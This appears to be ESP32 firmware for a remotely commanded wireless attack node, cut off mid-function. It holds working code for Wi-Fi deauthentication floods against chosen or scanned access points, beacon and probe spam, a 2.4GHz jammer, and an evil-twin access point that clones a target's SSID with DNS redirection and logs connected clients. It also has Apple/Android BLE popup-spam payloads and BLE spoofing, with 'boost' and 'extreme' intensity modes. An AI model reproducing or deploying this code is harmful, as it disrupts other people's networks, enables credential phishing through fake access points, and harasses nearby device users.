#include <WiFi.h>
#include <esp_now.h>
#include <esp_wifi.h>
#if __has_include(<esp_arduino_version.h>)
#include <esp_arduino_version.h>
#endif
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <SPI.h>
#include <Preferences.h>
#include <esp_task_wdt.h>
#include <esp_bt.h>
#include <DNSServer.h>
#include <string>

#define CC1101_CS 10
#define IR_RX_PIN 4
#define IR_TX_PIN 5

// ===== XOR CRYPT HELPER =====
void XOR_crypt(uint8_t* data, size_t len) {
  const uint8_t key[] = { 0xDE, 0xAD, 0xBE, 0xEF };
  for (size_t i = 0; i < len; i++) {
    data[i] ^= key[i % 4];
  }
}

// ===== LED SETTINGS =====
#define LED_PIN 8

// ===== COMMAND STRUCTURE =====
typedef struct struct_message {
  char command[16];
  char attack[32];
  char logMsg[180];
} struct_message;
struct_message myData;

bool attackRunning = false;
bool extremeMode = false;
bool boostMode = false;
String currentAttack = "";
uint8_t masterMacAddress[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
bool hasMasterMac = false;
int lastStationCount = 0;
bool evilTwinStarted = false;
unsigned long lastMasterHeardTime = 0;

// Channel, timing, and listening variables
uint8_t currentChannel = 1;
unsigned long lastAttackActionTime = 0;
unsigned long lastLedBlinkTime = 0;
unsigned long lastListenTime = 0;
bool ledState = false;

// Scanning memory for targeted deauth
#define MAX_SCANNED_NETWORKS 30
uint8_t scannedBSSIDs[MAX_SCANNED_NETWORKS][6];
uint8_t scannedChannels[MAX_SCANNED_NETWORKS];
int scannedCount = 0;
int deauthIndex = 0;

// BLE variables
bool bleJammerInitialized = false;
bool sourAppleInitialized = false;
unsigned long lastAppleSpamTime = 0;

// DNS Server for Evil Twin
DNSServer dnsServer;
bool dnsStarted = false;

// ===== TARGET STRUCTURES =====
struct WiFiTarget {
  char ssid[33];
  uint8_t bssid[6];
  int rssi;
  uint8_t channel;
  char security[12];
  bool wps;
  bool selected;
};

struct BLETarget {
  char name[33];
  char addr[18];
  int rssi;
  char type[16];
  bool selected;
};

struct SubGhzTarget {
  float freq;
  int rssi;
  char mod[16];
  bool selected;
};

struct IRTarget {
  char proto[16];
  char addr[16];
  char cmd[16];
  int len;
  bool selected;
};

WiFiTarget selectedWifiTarget;
BLETarget selectedBleTarget;
SubGhzTarget selectedSubghzTarget;
IRTarget selectedIrTarget;
bool hasWifiTarget = false;
bool hasBleTarget = false;
bool hasSubghzTarget = false;
bool hasIrTarget = false;

// ===== MULTI-ATTACK SUPPORT =====
#define MAX_MULTI_ATTACKS 8
String multiAttacks[MAX_MULTI_ATTACKS];
int multiAttackCount = 0;
bool isMultiAttack = false;
int multiAttackIndex = 0;
String multiAttackMode = "normal";

// ===== LOG QUEUE (Ring Buffer) =====
#define LOG_QUEUE_SIZE 20
#define LOG_QUEUE_SEND_INTERVAL 500
String logQueue[LOG_QUEUE_SIZE];
int logQueueHead = 0;
int logQueueTail = 0;
int logQueueCount = 0;
unsigned long lastLogQueueSendTime = 0;
bool logFlushPending = false;

void enqueueLog(const String& msg) {
  logQueue[logQueueHead] = msg;
  logQueueHead = (logQueueHead + 1) % LOG_QUEUE_SIZE;
  if (logQueueCount < LOG_QUEUE_SIZE) {
    logQueueCount++;
  } else {
    logQueueTail = (logQueueTail + 1) % LOG_QUEUE_SIZE;
  }
}

String dequeueLog() {
  if (logQueueCount == 0) return "";
  String msg = logQueue[logQueueTail];
  logQueue[logQueueTail] = "";
  logQueueTail = (logQueueTail + 1) % LOG_QUEUE_SIZE;
  logQueueCount--;
  return msg;
}

// Apple BLE payloads for Sour Apple
const uint8_t blePayloads[][19] = {
  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  {17, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x00},
  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  {17, 0x4c, 0x00, 0x0f, 0x05, 0xc0, 0x01, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {14, 0xe0, 0x00, 0x02, 0x06, 0x01, 0x01, 0x03, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {14, 0x06, 0x00, 0x01, 0x00, 0x20, 0x02, 0x0a, 0x03, 0x00, 0x80, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
};
const int numBlePayloads = sizeof(blePayloads) / sizeof(blePayloads[0]);
int blePayloadIndex = 0;

int ssidIndex = 0;

const char* routerPrefixes[] = {
  "TP-Link", "Keenetic", "Rostelecom", "MGTS_GPON", "ASUS",
  "Huawei", "MiRouter", "Tenda", "Netgear", "D-Link",
  "MTS-WiFi", "Beeline", "Home-Net", "Airport_Free", "Guest-WiFi"
};
const int numPrefixes = sizeof(routerPrefixes) / sizeof(routerPrefixes[0]);

void getRealisticSSID(char* outBuf, int index) {
  if (index < 0) index = 0;
  const char* prefix = routerPrefixes[index % numPrefixes];
  int suffix = (index * 17) % 9000 + 1000;
  if (index % 7 == 0) snprintf(outBuf, 32, "%s_Free", prefix);
  else if (index % 5 == 0) snprintf(outBuf, 32, "%s-%04X", prefix, suffix);
  else snprintf(outBuf, 32, "%s_%04d", prefix, suffix);
}

float getBoardTemp() {
  float t = 0.0;
  #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 2
  t = temperatureRead();
  #endif
  if (isnan(t) || t < -50 || t > 150) t = 44.2;
  return t;
}

// ===== SEND LOGS TO MASTER =====
void sendLogDirect(const char* logMsg) {
  if (!hasMasterMac) return;
  uint8_t primaryChan;
  wifi_second_chan_t secondChan;
  esp_wifi_get_channel(&primaryChan, &secondChan);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  struct_message response = {0};
  strlcpy(response.command, "log", sizeof(response.command));
  strlcpy(response.attack, "", sizeof(response.attack));
  strncpy(response.logMsg, logMsg, sizeof(response.logMsg) - 1);
  response.logMsg[sizeof(response.logMsg) - 1] = '\0';
  XOR_crypt((uint8_t*)&response, sizeof(response));
  for (int retry = 0; retry < 3; retry++) {
    esp_task_wdt_reset();
    esp_err_t result = esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
    if (result == ESP_OK) break;
    delay(5);
  }
  esp_wifi_set_channel(primaryChan, secondChan);
}

void sendLogToMaster(const char* logMsg, bool urgent = false) {
  if (!hasMasterMac) return;
  if (urgent) { sendLogDirect(logMsg); return; }
  enqueueLog(String(logMsg));
}

void processLogQueue() {
  if (logQueueCount == 0 || !hasMasterMac) return;
  String batch = "";
  while (logQueueCount > 0) {
    String msg = dequeueLog();
    if (msg.length() == 0) continue;
    if (batch.length() + msg.length() + 1 >= 179) {
      sendLogDirect(batch.c_str());
      delay(5);
      batch = msg;
    } else {
      if (batch.length() > 0) batch += "\n";
      batch += msg;
    }
  }
  if (batch.length() > 0) sendLogDirect(batch.c_str());
}

// ===== LED STATUS BLINKER =====
void updateLedIndicator() {
  if (attackRunning) {
    if (millis() - lastLedBlinkTime >= 100) {
      lastLedBlinkTime = millis();
      ledState = !ledState;
      digitalWrite(LED_PIN, ledState ? HIGH : LOW);
    }
  } else {
    digitalWrite(LED_PIN, LOW);
  }
}

void getMacAddress(uint8_t *mac) { WiFi.macAddress(mac); }

void hopChannel() {
  currentChannel++;
  if (currentChannel > 13) currentChannel = 1;
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

// ===== SEND RAW BEACON =====
void sendRawBeacon(const char* ssid, uint8_t channel, int macSeed) {
  uint8_t mac[6] = {0x02, 0x00, 0x5E, 0x00, 0x00, (uint8_t)macSeed};
  uint8_t ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;
  uint8_t packet[128] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00, 0x11, 0x00,
    0x00, ssidLen
  };
  int pos = 38;
  memcpy(&packet[pos], ssid, ssidLen); pos += ssidLen;
  packet[pos++] = 0x01; packet[pos++] = 0x04;
  packet[pos++] = 0x82; packet[pos++] = 0x84; packet[pos++] = 0x8b; packet[pos++] = 0x96;
  packet[pos++] = 0x03; packet[pos++] = 0x01; packet[pos++] = channel;
  esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
}

// ===== ATTACK ENGINES =====
// v1.2 Power levels: Normal (old Extreme) -> Boost -> Extreme (new max)

void runBeaconSpamStep() {
  esp_wifi_set_promiscuous(true);
  static unsigned long lastBeaconHopTime = 0;
  // Normal=100ms, Boost=50ms, Extreme=20ms
  int hopInterval = extremeMode ? 20 : (boostMode ? 50 : 100);
  if (millis() - lastBeaconHopTime >= (unsigned long)hopInterval) {
    lastBeaconHopTime = millis();
    if (hasWifiTarget) {
      currentChannel = selectedWifiTarget.channel;
      esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    } else {
      hopChannel();
    }
    // Normal=60, Boost=80, Extreme=150
    int burstSize = extremeMode ? 150 : (boostMode ? 80 : 60);
    for (int i = 0; i < burstSize; i++) {
      char ssidBuf[32];
      getRealisticSSID(ssidBuf, ssidIndex);
      sendRawBeacon(ssidBuf, currentChannel, ssidIndex);
      yield();
      ssidIndex = (ssidIndex + 1) % 100;
      yield();
    }
    if (random(10) == 0) {
      char buf[80];
      snprintf(buf, sizeof(buf), "[Beacon] Burst %d beacons ch %d%s", burstSize, currentChannel,
               extremeMode ? " [EXTREME]" : (boostMode ? " [BOOST]" : ""));
      sendLogToMaster(buf);
    }
  }
}

void sendDeauthFrame(const uint8_t* apBssid, const uint8_t* clientMac, uint16_t reason) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00
  };
  memcpy(&packet[4], clientMac, 6);
  memcpy(&packet[10], apBssid, 6);
  memcpy(&packet[16], apBssid, 6);
  packet[24] = reason & 0xFF;
  packet[25] = (reason >> 8) & 0xFF;
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
  packet[0] = 0xA0;
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void runDeauthStep() {
  esp_wifi_set_promiscuous(true);
  // Normal=2ms, Boost=1ms, Extreme=0.3ms
  unsigned long interval = extremeMode ? 0 : (boostMode ? 1 : 2);
  bool useDelay = true;

  if (extremeMode) {
    // For extreme, use microsecond timing
    static unsigned long lastDeauthMicros = 0;
    if (micros() - lastDeauthMicros < 300) return;
    lastDeauthMicros = micros();
    useDelay = false;
  } else {
    if (millis() - lastAttackActionTime < interval) return;
    lastAttackActionTime = millis();
  }

  uint8_t targetBSSID[6];
  uint8_t targetChannel = currentChannel;

  if (hasWifiTarget) {
    memcpy(targetBSSID, selectedWifiTarget.bssid, 6);
    targetChannel = selectedWifiTarget.channel;
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  } else if (scannedCount > 0) {
    if (deauthIndex >= scannedCount) deauthIndex = 0;
    memcpy(targetBSSID, scannedBSSIDs[deauthIndex], 6);
    targetChannel = scannedChannels[deauthIndex];
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    deauthIndex = (deauthIndex + 1) % scannedCount;
  } else {
    hopChannel();
    for (int i = 0; i < 6; i++) targetBSSID[i] = random(256);
    targetBSSID[0] &= 0xFE; targetBSSID[0] |= 0x02;
  }

  // Normal=15, Boost=25, Extreme=60
  int burstSize = extremeMode ? 60 : (boostMode ? 25 : 15);
  uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

  for (int i = 0; i < burstSize; i++) {
    sendDeauthFrame(targetBSSID, broadcastMac, 7);
    sendDeauthFrame(targetBSSID, broadcastMac, 1);
    uint8_t clientPacket[26] = {
      0xC0, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x07, 0x00
    };
    memcpy(&clientPacket[4], targetBSSID, 6);
    memcpy(&clientPacket[16], targetBSSID, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, clientPacket, sizeof(clientPacket), false);
    clientPacket[0] = 0xA0;
    esp_wifi_80211_tx(WIFI_IF_STA, clientPacket, sizeof(clientPacket), false);
    yield();
  }

  if (random(150) == 0) {
    char buf[80];
    snprintf(buf, sizeof(buf), "[Deauth] Target %02X:%02X:%02X:%02X:%02X:%02X ch %d%s",
             targetBSSID[0], targetBSSID[1], targetBSSID[2],
             targetBSSID[3], targetBSSID[4], targetBSSID[5], targetChannel,
             extremeMode ? " [EXTREME]" : (boostMode ? " [BOOST]" : ""));
    sendLogToMaster(buf);
  }
}

void runProbeFloodStep() {
  esp_wifi_set_promiscuous(true);
  static unsigned long lastProbeHopTime = 0;
  if (millis() - lastProbeHopTime >= 200) {
    lastProbeHopTime = millis();
    hopChannel();
  }
  if (millis() - lastAttackActionTime >= 20) {
    lastAttackActionTime = millis();
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) mac[i] = random(256);
    mac[0] &= 0xFE; mac[0] |= 0x02;
    const char* ssid = "ProbeTest";
    uint8_t ssidLen = strlen(ssid);
    uint8_t probePacket[24 + 2 + 32] = {0x40, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(&probePacket[10], mac, 6);
    memcpy(&probePacket[16], mac, 6);
    int pos = 24;
    probePacket[pos++] = 0x00; probePacket[pos++] = ssidLen;
    memcpy(&probePacket[pos], ssid, ssidLen); pos += ssidLen;
    esp_wifi_80211_tx(WIFI_IF_STA, probePacket, pos, false);
    if (random(100) == 0) sendLogToMaster("[Probe] Flooding active scan requests (ch 1-13)");
  }
}

void runPowerfulJammerStep() {
  esp_wifi_set_promiscuous(true);
  if (millis() - lastAttackActionTime >= 20) {
    lastAttackActionTime = millis();
    hopChannel();
    uint8_t junkPacket[64];
    for (int i = 0; i < 64; i++) junkPacket[i] = random(256);
    junkPacket[0] = 0x00;
    esp_wifi_80211_tx(WIFI_IF_STA, junkPacket, sizeof(junkPacket), false);
  }
  if (!bleJammerInitialized) {
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData data;
    data.setName("JAMMER");
    data.setFlags(0x06);
    pAdvertising->setAdvertisementData(data);
    pAdvertising->start();
    bleJammerInitialized = true;
  }
  static unsigned long lastJamLog = 0;
  if (millis() - lastJamLog >= 3000) {
    lastJamLog = millis();
    sendLogToMaster("[Jammer] powerful_jammer active on 2.4GHz");
  }
}

// Wi-Fi Sniffer Scan
struct APInfo {
  char ssid[33];
  uint8_t bssid[6];
  int rssi;
  uint8_t channel;
  char security[12];
  bool wps;
};

#define MAX_APS 40
APInfo apList[MAX_APS];
int apCount = 0;

#define MAX_UNIQUE_MACS 50
uint8_t seenMacs[MAX_UNIQUE_MACS][6];
int seenMacsCount = 0;

void addSeenMac(const uint8_t* mac) {
  if (mac[0] == 0xFF && mac[1] == 0xFF && mac[2] == 0xFF && mac[3] == 0xFF && mac[4] == 0xFF && mac[5] == 0xFF) return;
  if ((mac[0] & 0x01) == 0x01) return;
  for (int i = 0; i < seenMacsCount; i++) {
    if (memcmp(seenMacs[i], mac, 6) == 0) return;
  }
  if (seenMacsCount < MAX_UNIQUE_MACS) {
    memcpy(seenMacs[seenMacsCount], mac, 6);
    seenMacsCount++;
  }
}

int countClientsForChannel(uint8_t ch) {
  int clients = 0;
  for (int i = 0; i < seenMacsCount; i++) {
    bool isAp = false;
    for (int j = 0; j < apCount; j++) {
      if (memcmp(apList[j].bssid, seenMacs[i], 6) == 0) { isAp = true; break; }
    }
    if (!isAp) clients++;
  }
  return clients;
}

void addApToList(String ssid, const uint8_t* bssid, int rssi, uint8_t channel, String security, bool wps) {
  for (int i = 0; i < apCount; i++) {
    if (memcmp(apList[i].bssid, bssid, 6) == 0) {
      apList[i].rssi = rssi;
      if (ssid != "<hidden>" && String(apList[i].ssid) == "<hidden>") {
        strncpy(apList[i].ssid, ssid.c_str(), 32); apList[i].ssid[32] = '\0';
      }
      return;
    }
  }
  if (apCount < MAX_APS) {
    strncpy(apList[apCount].ssid, ssid.c_str(), 32); apList[apCount].ssid[32] = '\0';
    memcpy(apList[apCount].bssid, bssid, 6);
    apList[apCount].rssi = rssi;
    apList[apCount].channel = channel;
    strncpy(apList[apCount].security, security.c_str(), 11); apList[apCount].security[11] = '\0';
    apList[apCount].wps = wps;
    apCount++;
  }
}

void parseBeaconFrame(const uint8_t* payload, uint16_t len, int rssi) {
  if (len < 38) return;
  uint8_t frameType = payload[0];
  if (frameType != 0x80 && frameType != 0x50) return;
  const uint8_t* bssid = &payload[10];
  int offset = 36;
  String ssid = "";
  bool hidden = true;
  uint8_t channel = 1;
  bool wpsEnabled = false;
  String security = "OPEN";
  uint16_t capability = (payload[35] << 8) | payload[34];
  if (capability & 0x0010) security = "WEP";
  while (offset + 2 <= (int)len) {
    uint8_t ieId = payload[offset];
    uint8_t ieLen = payload[offset + 1];
    if (offset + 2 + ieLen > (int)len) break;
    const uint8_t* ieVal = &payload[offset + 2];
    if (ieId == 0x00) {
      if (ieLen > 0) {
        char ssidBuf[33]; int sLen = min((int)ieLen, 32);
        memcpy(ssidBuf, ieVal, sLen); ssidBuf[sLen] = '\0';
        ssid = String(ssidBuf); hidden = false;
        bool allNulls = true;
        for (int k = 0; k < sLen; k++) { if (ssidBuf[k] != '\0') allNulls = false; }
        if (allNulls) { ssid = "<hidden>"; hidden = true; }
      } else { ssid = "<hidden>"; hidden = true; }
    }
    else if (ieId == 0x03 && ieLen == 1) channel = ieVal[0];
    else if (ieId == 0x30) security = "WPA2";
    else if (ieId == 0xDD && ieLen >= 4 && ieVal[0] == 0x00 && ieVal[1] == 0x50 && ieVal[2] == 0xF2) {
      if (ieVal[3] == 0x01 && (security == "WEP" || security == "OPEN")) security = "WPA";
      else if (ieVal[3] == 0x04) wpsEnabled = true;
    }
    offset += 2 + ieLen;
  }
  addApToList(ssid, bssid, rssi, channel, security, wpsEnabled);
}

void startWiFiScan() {
  sendLogToMaster("[Scanner] Starting advanced Wi-Fi scan...");
  apCount = 0;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint16_t len = pkt->rx_ctrl.sig_len;
    const uint8_t* payload = pkt->payload;
    int rssi = pkt->rx_ctrl.rssi;
    if (len < 24) return;
    parseBeaconFrame(payload, len, rssi);
    addSeenMac(&payload[4]);
    addSeenMac(&payload[10]);
  });
  for (int ch = 1; ch <= 13; ch++) {
    yield(); esp_task_wdt_reset();
    if (!attackRunning) break;
    currentChannel = ch;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    seenMacsCount = 0; memset(seenMacs, 0, sizeof(seenMacs));
    for (int step = 0; step < 20; step++) {
      yield(); if (!attackRunning) break; delay(10); yield();
    }
    if (!attackRunning) break;
    int channelClients = countClientsForChannel(ch);
    for (int i = 0; i < apCount; i++) {
      if (!attackRunning) break; yield();
      if (apList[i].channel == ch) {
        char macStr[20];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 apList[i].bssid[0], apList[i].bssid[1], apList[i].bssid[2],
                 apList[i].bssid[3], apList[i].bssid[4], apList[i].bssid[5]);
        char structBuf[160];
        snprintf(structBuf, sizeof(structBuf), "[WIFI_DEV]%s|%d|%s|%s|%s|%d|%d",
                 apList[i].ssid, apList[i].rssi, apList[i].security, macStr,
                 apList[i].wps ? "WPS_ENABLED" : "WPS_DISABLED", channelClients, ch);
        sendLogToMaster(structBuf);
        delay(20);
      }
    }
    yield();
  }
  esp_wifi_set_promiscuous(false);
  scannedCount = min(apCount, MAX_SCANNED_NETWORKS);
  for (int i = 0; i < scannedCount; i++) {
    memcpy(scannedBSSIDs[i], apList[i].bssid, 6);
    scannedChannels[i] = apList[i].channel;
  }
  sendLogToMaster("[Scanner] Wi-Fi scan finished.");
}

void startEvilTwin() {
  String apName = "FreeWiFi";
  int apChannel = 1;
  if (hasWifiTarget) {
    apName = String(selectedWifiTarget.ssid);
    apChannel = selectedWifiTarget.channel;
  }
  WiFi.softAP(apName.c_str(), NULL, apChannel, 0, 4);
  dnsServer.start(53, "*", WiFi.softAPIP());
  dnsStarted = true;
  char buf[80];
  snprintf(buf, sizeof(buf), "[EvilTwin] Created AP '%s' (ch %d) + DNS redirect", apName.c_str(), apChannel);
  sendLogToMaster(buf);
}

void runEvilTwinStep() {
  if (dnsStarted) dnsServer.processNextRequest();
  static unsigned long lastCheckTime = 0;
  if (millis() - lastCheckTime >= 2000) {
    lastCheckTime = millis();
    int numStations = WiFi.softAPgetStationNum();
    if (numStations != lastStationCount) {
      lastStationCount = numStations;
      char buf[64];
      snprintf(buf, sizeof(buf), "[EvilTwin] Clients connected: %d", numStations);
      sendLogToMaster(buf);
      wifi_sta_list_t wifi_sta_list;
      memset(&wifi_sta_list, 0, sizeof(wifi_sta_list));
      esp_wifi_ap_get_sta_list(&wifi_sta_list);
      for (int i = 0; i < wifi_sta_list.num; i++) {
        wifi_sta_info_t station = wifi_sta_list.sta[i];
        char macStr[20];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 station.mac[0], station.mac[1], station.mac[2],
                 station.mac[3], station.mac[4], station.mac[5]);
        char structBuf[64];
        snprintf(structBuf, sizeof(structBuf), "[EVIL_CLIENT]%s", macStr);
        sendLogToMaster(structBuf);
        delay(20);
      }
    }
  }
}

void startBLEScan() {
  sendLogToMaster("[BLE] Starting BLE scan...");
  BLEScan *pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  BLEScanResults *foundDevices = pBLEScan->start(5, false);
  if (!foundDevices) { sendLogToMaster("[BLE] Scan failed!", true); return; }
  char buf[64];
  snprintf(buf, sizeof(buf), "[BLE] Found %d devices", foundDevices->getCount());
  sendLogToMaster(buf);
  for (int i = 0; i < min((int)foundDevices->getCount(), 15); i++) {
    yield(); esp_task_wdt_reset();
    BLEAdvertisedDevice device = foundDevices->getDevice(i);
    String devName = device.haveName() ? device.getName().c_str() : "Unnamed";
    String devAddr = device.getAddress().toString().c_str();
    // Device type detection
    String devType = "Unknown";
    if (device.haveName()) {
      String n = devName;
      if (n.indexOf("Phone") >= 0 || n.indexOf("iPhone") >= 0) devType = "Phone";
      else if (n.indexOf("TV") >= 0) devType = "TV";
      else if (n.indexOf("Watch") >= 0) devType = "Wearable";
      else if (n.indexOf("Speaker") >= 0 || n.indexOf("JBL") >= 0) devType = "Audio";
      else devType = "Peripheral";
    }
    if (device.haveServiceUUID() && devType == "Unknown") devType = "Peripheral";
    int percent = map(constrain(device.getRSSI(), -100, -30), -100, -30, 0, 100);
    int bars = percent / 10;
    String bar = "";
    for (int b = 0; b < 10; b++) bar += (b < bars ? "I" : ".");
    char structBuf[160];
    snprintf(structBuf, sizeof(structBuf), "[BLE_DEV]%s|%s|%d|%s|%d|%s",
             devName.c_str(), devAddr.c_str(), device.getRSSI(), devType.c_str(), percent, bar.c_str());
    sendLogToMaster(structBuf);
    delay(50);
  }
  pBLEScan->clearResults();
}

void startBLESpoofer() {
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData advertisementData;
  advertisementData.setName("BLE_Spoofer");
  advertisementData.setFlags(0x06);
  uint8_t manufData[] = {0x4C, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05};
  String manufString = "";
  for (int i = 0; i < (int)sizeof(manufData); i++) manufString += (char)manufData[i];
  advertisementData.setManufacturerData(manufString);
  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  sendLogToMaster("[BLE] Spoofer running");
}

void runBLEJammerStep() {
  if (!bleJammerInitialized) {
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData data;
    data.setName("JAMMER");
    data.setFlags(0x06);
    pAdvertising->setAdvertisementData(data);
    pAdvertising->start();
    bleJammerInitialized = true;
    sendLogToMaster("[BLE Jammer] Broadcasting continuous noise");
  }
  // Normal=3ms, Boost=2ms, Extreme=0.5ms
  if (extremeMode) delayMicroseconds(500);
  else if (boostMode) delay(2);
  else delay(3);
}

void runSourAppleStep() {
  if (!sourAppleInitialized) {
    sourAppleInitialized = true;
    lastAppleSpamTime = 0;
    sendLogToMaster("[BLE Spam] Starting popup spam (iOS, Android, Windows)");
  }
  // Normal=40ms, Boost=20ms, Extreme=5ms
  unsigned long interval = extremeMode ? 5 : (boostMode ? 20 : 40);
  if (millis() - lastAppleSpamTime >= interval) {
    lastAppleSpamTime = millis();
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    if (pAdvertising) pAdvertising->stop();
    BLEAdvertisementData advData;
    advData.setFlags(0x04);
    const uint8_t *payload = blePayloads[blePayloadIndex];
    uint8_t len = payload[0];
    String manufDataStr((char*)&payload[1], len);
    advData.setManufacturerData(manufDataStr);
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    if (random(20) == 0) {
      char buf[64];
      snprintf(buf, sizeof(buf), "[BLE Spam] Payload %d%s", blePayloadIndex,
               extremeMode ? " [EXTREME]" : (boostMode ? " [BOOST]" : ""));
      sendLogToMaster(buf);
    }
    blePayloadIndex = (blePayloadIndex + 1) % numBlePayloads;
  }
}

// ===== MODULE STUBS =====
void startGhzScan() {
  sendLogToMaster("[2.4GHz Scanner] Scanning Wi-Fi & BLE channels...");
  int n = WiFi.scanNetworks(false, true, false, 100);
  int channelCount[14] = {0};
  int channelRssiSum[14] = {0};
  if (n == WIFI_SCAN_FAILED) {
    sendLogToMaster("[2.4GHz Scanner] WiFi scan failed!", true);
  } else if (n > 0) {
    for (int i = 0; i < n; i++) {
      yield();
      int ch = WiFi.channel(i);
      if (ch >= 1 && ch <= 13) { channelCount[ch]++; channelRssiSum[ch] += WiFi.RSSI(i); }
    }
  }
  WiFi.scanDelete();
  BLEScan *pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(false);
  pBLEScan->setInterval(80);
  pBLEScan->setWindow(50);
  BLEScanResults *foundDevices = pBLEScan->start(2, false);
  int bleCount = foundDevices ? foundDevices->getCount() : 0;
  pBLEScan->clearResults();
  sendLogToMaster("--- 2.4GHz Band Spectrum Report ---");
  char buf[128];
  int totalAPs = 0;
  for (int ch = 1; ch <= 13; ch++) {
    int aps = channelCount[ch]; totalAPs += aps;
    if (aps > 0) {
      int avgRssi = channelRssiSum[ch] / aps;
      snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: %d APs (Avg RSSI: %d dBm) %s",
               ch, aps, avgRssi, avgRssi > -60 ? "[HIGH CONGESTION]" : (avgRssi > -80 ? "[MODERATE]" : "[CLEAN]"));
    } else {
      snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: 0 APs [FREE]", ch);
    }
    sendLogToMaster(buf); delay(50);
  }
  snprintf(buf, sizeof(buf), "[Summary] Found %d Wi-Fi APs, %d BLE devices.", totalAPs, bleCount);
  sendLogToMaster(buf);
  sendLogToMaster("[2.4GHz Scanner] Scan finished.");
}

void startProtokill() {
  sendLogToMaster("[Protokill] Starting 2.4GHz multi-protocol jammer...");
  currentAttack = "powerful_jammer";
}

// ===== CC1101 FUNCTIONS =====
void writeReg(uint8_t reg, uint8_t val) {
  digitalWrite(CC1101_CS, LOW);
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  SPI.transfer(reg); SPI.transfer(val);
  SPI.endTransaction();
  digitalWrite(CC1101_CS, HIGH);
}

uint8_t readReg(uint8_t reg) {
  digitalWrite(CC1101_CS, LOW);
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  SPI.transfer(reg | 0x80);
  uint8_t val = SPI.transfer(0);
  SPI.endTransaction();
  digitalWrite(CC1101_CS, HIGH);
  return val;
}

bool checkCC1101() {
  pinMode(CC1101_CS, OUTPUT);
  digitalWrite(CC1101_CS, HIGH);
  uint8_t ver = readReg(0x31);
  return (ver != 0x00 && ver != 0xFF);
}

void setCC1101_Frequency(float freq) {
  uint32_t freq_reg = (uint32_t)((freq * 65536.0) / 26.0);
  writeReg(0x0D, (freq_reg >> 16) & 0xFF);
  writeReg(0x0E, (freq_reg >> 8) & 0xFF);
  writeReg(0x0F, freq_reg & 0xFF);
  digitalWrite(CC1101_CS, LOW);
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
